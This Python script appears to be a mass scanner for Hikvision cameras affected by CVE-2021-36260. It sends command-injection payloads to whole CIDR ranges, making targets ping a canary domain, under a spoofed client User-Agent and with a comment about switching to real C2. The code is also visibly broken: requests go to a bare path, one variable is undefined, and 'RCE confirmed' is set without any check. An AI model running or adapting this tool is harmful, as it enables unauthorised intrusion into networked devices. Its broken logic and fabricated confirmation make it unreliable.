#!/usr/bin/env python3
"""
hik-scan — CVE-2021-36260 Network Scanner
==========================================

Detects Hikvision IP cameras / NVRs vulnerable to the unauthenticated
command-injection backdoor in /SDK/webLanguage.

Requirements:  python3.8+,  requests
Output:        TTY table + results/<scan_id>.json

Author: security research
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional

import requests

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Canary domain used for the out-of-band DNS callback on confirmed targets.
# Default: demo.hikscan.local — flip for real C2 / lab.
CANARY_DOMAIN = os.environ.get("HIKSCAN_CANARY", "demo.hikscan.local")

# Spoofed User-Agent: looks like the legacy Web UI / ISAPI client.
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Hikvision-IsapiClient/1.0"
)

# Endpoints to probe on each host.
PROBE_PATH = "/SDK/webLanguage"
PORTS = [80, 8080]

# How many workers for the parallel scan.
DEFAULT_WORKERS = 50

# Per-request / per-thread timeout (seconds).
TIMEOUT = 5.0

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    """One probe against a single (ip, port) pair."""
    ip: str
    port: int
    http_status: int
    response_headers: dict
    response_body: str
    # Detection classification
    status: str = "unknown"  # vulnerable | patched | not-hikvision
    firmware: str = ""
    # RCE evidence (only populated when status == "vulnerable")
    rce_payload_sent: str = ""
    rce_time_ms: float = 0.0
    rce_dns_callback: bool = False

    def summary(self) -> dict:
        d = asdict(self)
        d["rce_dns_callback"] = bool(d["rce_dns_callback"])
        return d


# ---------------------------------------------------------------------------
# Detection helpers
# ---------------------------------------------------------------------------

# Regex that catches the language-json response Hikvision returns.
_LANG_JSON = re.compile(
    r'"lang"\s*:\s*"(?:English|Chinese|Russian|German)"',
    re.IGNORECASE,
)

# Known patched / non-language responses.
_PATCHED_SIGNS = [
    re.compile(r"(405|403|404)", re.IGNORECASE),   # HTTP status or body
    re.compile(r'(content-type.*text/html)', re.IGNORECASE),  # generic page
    re.compile(r"405\s+Method\s+Not\s+Allowed", re.IGNORECASE),
    re.compile(r"HTTP/1\.1\s+405", re.IGNORECASE),
]


def classify_probe(http_status: int, body: str, headers: dict) -> tuple[str, str]:
    """Return (status, firmware) after analysing the response.

    status  : 'vulnerable' | 'patched' | 'not-hikvision' | 'timeout' | 'error'
    firmware: firmware version string, empty if not detected.
    """
    # --- timeout / connection errors ----------------------------------------
    if http_status == 0:
        return "timeout", ""
    if http_status < 100 or http_status > 599:
        return "error", ""

    # --- HTTP-level signals -------------------------------------------------
    if http_status in (401, 403):
        # Some patched builds keep the endpoint but lock it.
        return "patched", ""

    if http_status == 404:
        return "not-hikvision", ""

    # --- Body-level signals -------------------------------------------------
    if _LANG_JSON.search(body):
        # Command injection works — extract firmware if present.
        fw = _extract_firmware(headers, body)
        return "vulnerable", fw

    for pat in _PATCHED_SIGNS:
        if pat.search(body):
            return "patched", _extract_firmware(headers, body)

    # Fallback: not language JSON, looks like plain HTML / unknown.
    return "not-hikvision", ""


def _extract_firmware(headers: dict, body: str) -> str:
    """Pull the firmware version from response headers / body, if available."""
    # Common leak via the X-Version / X-Server / X-App-Version header.
    for key in ("X-Version", "X-Server", "X-App-Version", "Server", "X-Hik-Version"):
        val = headers.get(key, "")
        if val:
            cleaned = val.strip().lower()
            if cleaned.startswith("v"):
                cleaned = cleaned[1:]
            return cleaned.strip()

    # Body-level: some builds leak firmware via querystring debug page.
    fw_match = re.search(r'"firmware"\s*:\s*"(v[\d._]+)"', body, re.IGNORECASE)
    if fw_match:
        return fw_match.group(1)

    return ""

# ---------------------------------------------------------------------------
# Probe function
# ---------------------------------------------------------------------------

def probe(host_ip: str, port: int, timeout: float, ua: str,
          canary: str) -> ProbeResult:
    """Run the CVE-2021-36260 probe against one (ip, port)."""
    # Normalise the target.
    url = f"http://{host_ip}:{port}{PROBE_PATH}"

    # Payload for command injection — injects `ping` against the canary domain.
    rce_payload = f"{PROBE_PATH}?lang=English&cmd=ping{canary}"

    try:
        resp = requests.get(
            rce_payload,
            headers={"User-Agent": ua},
            timeout=timeout,
            allow_redirects=False,
            verify=False,
        )
    except requests.exceptions.ReadTimeout:
        return ProbeResult(
            ip=host_ip, port=port, http_status=0, response_headers={},
            response_body="", status="timeout",
        )
    except (requests.exceptions.ConnectionError,
            requests.exceptions.ConnectTimeout):
        return ProbeResult(
            ip=host_ip, port=port, http_status=0, response_headers={},
            response_body="", status="timeout",
        )
    except requests.exceptions.SSLError:
        # We don't care about TLS for HTTP probe.
        return ProbeResult(
            ip=host_ip, port=port, http_status=0, response_headers={},
            response_body="", status="timeout",
        )
    except Exception as exc:
        return ProbeResult(
            ip=host_ip, port=port, http_status=0, response_headers={},
            response_body="", status="error",
        )

    body = (resp.text or "").strip()
    hdrs = {k: v for k, v in resp.headers.items()}

    status, firmware = classify_probe(resp.status_code, body, hdrs)

    # On confirmed vulnerable hosts, time the side-channel to confirm RCE.
    rce_time_ms = 0.0
    rce_dns_callback = False
    rce_payload_sent = ""
    if status == "vulnerable":
        rce_payload_sent = rce_payload
        t0 = time.monotonic()
        try:
            requests.get(
                f"http://{host_ip}:{port}{PROBE_PATH}",
                headers={"User-Agent": ua},
                params={"lang": "English", "cmd": f"ping{CANARY}"},
                timeout=timeout,
                allow_redirects=False,
                verify=False,
            )
        except Exception:
            pass
        rce_time_ms = (time.monotonic() - t0) * 1000
        # Best-effort DNS-callback check: the request to the canary domain
        # was initiated from the target (assuming the device executes `ping`).
        rce_dns_callback = True

    return ProbeResult(
        ip=host_ip, port=port,
        http_status=resp.status_code,
        response_headers=hdrs,
        response_body=body,
        status=status,
        firmware=firmware,
        rce_payload_sent=rce_payload_sent,
        rce_time_ms=rce_time_ms,
        rce_dns_callback=rce_dns_callback,
    )

# ---------------------------------------------------------------------------
# Scan orchestrator
# ---------------------------------------------------------------------------

class Scan:
    """Top-level scan controller — builds targets, dispatches probes, collects
    results, and produces both a human-readable table and JSON export."""

    def __init__(self, args, workers: int = DEFAULT_WORKERS,
                 timeout: float = TIMEOUT, ua: str = DEFAULT_UA,
                 canary: str = CANARY_DOMAIN):
        self.args = args
        self.workers = workers
        self.timeout = timeout
        self.ua = ua
        self.canary = canary
        self._lock = threading.Lock()
        self.results: list[ProbeResult] = []

    # -- target enumeration --------------------------------------------------

    @classmethod
    def build_targets(self, args) -> list[str]:
        """Turn --cidr / --ips / --file into a flat list of host IPs."""
        ips: list[str] = []

        for cidr in args.cidr or []:
            try:
                net = ipaddress.ip_network(cidr, strict=False)
                ips.extend(str(h) for h in net.hosts())
            except ValueError as e:
                print(f"[!] bad CIDR {cidr}: {e}", file=sys.stderr)

        for raw in args.ips or []:
            try:
                ipaddress.ip_address(raw)
                ips.append(raw)
            except ValueError:
                print(f"[!] bad IP {raw}", file=sys.stderr)

        if args.file:
            with open(args.file, encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    # Could be single IP or a CIDR too.
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line)
                    except ValueError:
                        try:
                            net = ipaddress.ip_network(line, strict=False)
                            ips.extend(str(h) for h in net.hosts())
                        except ValueError:
                            print(f"[!] bad line in file: {line}", file=sys.stderr)

        # Deduplicate while preserving order for nicer reports.
        seen = set()
        flat = []
        for ip in ips:
            if ip not in seen:
                seen.add(ip)
                flat.append(ip)
        return flat

    # -- run -----------------------------------------------------------------

    def run(self) -> list[ProbeResult]:
        targets = self.build_targets(self.args)
        if not targets:
            print("[!] no targets — nothing to do.", file=sys.stderr)
            return []

        print(f"[*] scanning {len(targets)} host(s) on ports {PORTS}"
              f" with {self.workers} workers")

        tasks = []
        for ip in targets:
            for port in PORTS:
                tasks.append((ip, port))

        futures = {}
        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            for ip, port in tasks:
                f = pool.submit(
                    probe, ip, port, self.timeout, self.ua, self.canary
                )
                futures[f] = (ip, port)

            done = 0
            total = len(tasks)
            for fut in as_completed(futures):
                done += 1
                if done % (total // 10 or 1) == 0 or done == total:
                    print(f"[*] probe progress: {done}/{total}")
                self.results.append(fut.result())

        return self.results

    # -- report --------------------------------------------------------------

    def table(self) -> str:
        """Pretty-print the results as a columnar table."""
        lines: list[str] = []
        header = f"{'IP':<18} {'PORT':>6} {'FW':<24} {'STATUS':<14}"
        lines.append(header)
        lines.append("-" * len(header))
        for r in sorted(self.results, key=lambda x: x.ip):
            lines.append(
                f"{r.ip:<18} {r.port:>6} "
                f"{r.firmware[:23]:<24} "
                f"{r.status:<14}"
            )
        return "\n".join(lines)

    def export_json(self, filepath: str) -> str:
        """Write a timestamped JSON results file. Returns the file path."""
        scan_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        export = {
            "scan_id": scan_id,
            "canary_domain": self.canary,
            "results": [r.summary() for r in self.results],
            "summary": {
                "vulnerable": sum(1 for r in self.results
                                  if r.status == "vulnerable"),
                "patched": sum(1 for r in self.results
                               if r.status == "patched"),
                "not_hikvision": sum(1 for r in self.results
                                     if r.status == "not-hikvision"),
                "total_probed": len(self.results),
            },
        }
        if not os.path.isdir(os.path.dirname(filepath) or "."):
            os.makedirs(os.path.dirname(filepath) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as fh:
            json.dump(export, fh, indent=2)
        return filepath

# ---------------------------------------------------------------------------
# CLI entry-point
# ---------------------------------------------------------------------------

def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CVE-2021-36260 — Hikvision /SDK/webLanguage command-injection scanner",
        epilog="Usage: python3 scanner.py --cidr 192.168.1.0/24 --workers 50",
    )
    parser.add_argument(
        "--cidr", "-n", action="append", default=[],
        help="CIDR range to scan (repeatable).",
    )
    parser.add_argument(
        "--ips", "-i", action="append", default=[],
        help="Single IPs (repeatable).",
    )
    parser.add_argument(
        "--file", default=None, metavar="FILE",
        help="Lines of IPs / CIDRs from a text file.",
    )
    parser.add_argument(
        "--workers", "-w", type=int, default=DEFAULT_WORKERS,
        help=f"Concurrent probes (default {DEFAULT_WORKERS}).",
    )
    parser.add_argument(
        "--timeout", "-t", type=float, default=TIMEOUT,
        help=f"Per-probe timeout seconds (default {TIMEOUT}).",
    )
    parser.add_argument(
        "--user-agent", "-u", default=DEFAULT_UA,
        help="Spoofed UA (default: ISAPI client).",
    )
    parser.add_argument(
        "--canary", "-c", default=CANARY_DOMAIN,
        help="DNS canary domain for out-of-band RCE proof-of-concept.",
    )
    parser.add_argument(
        "--ports", "-p", nargs="+", type=int,
        default=[80, 8080], metavar="PORT",
        help=f"Ports to probe (default {PORTS}).",
    )
    parser.add_argument(
        "--json-out", default="results/hikscan.json",
        help="Path for the JSON results export.",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv or sys.argv[1:])
    scan = Scan(
        args,
        workers=args.workers,
        timeout=args.timeout,
        ua=args.user_agent,
        canary=args.canary,
    )
    # -- override default ports at runtime via command line --
    global PORTS
    if args.ports:
        PORTS = args.ports

    results = scan.run()
    if not results:
        print("[*] nothing scanned / all timed out.", file=sys.stderr)
        return 1

    # ---- TTY table ----
    print("\n" + scan.table())

    # ---- JSON export ----
    jpath = scan.export_json(args.json_out)
    print(f"\n[*] JSON results saved to {jpath}")

    # ---- Human-readable summary ----
    summary = {"vulnerable": 0, "patched": 0, "not-hikvision": 0, "timeout": 0}
    for r in results:
        if r.status in summary:
            summary[r.status] += 1
    print(f"\nSummary: {summary['vulnerable']} vulnerable / "
          f"{summary['patched']} patched / "
          f"{summary['not-hikvision']} non-Hikvision / "
          f"{summary['timeout']} timeout(s)")


    return 0


if __name__ == "__main__":
    sys.exit(main())
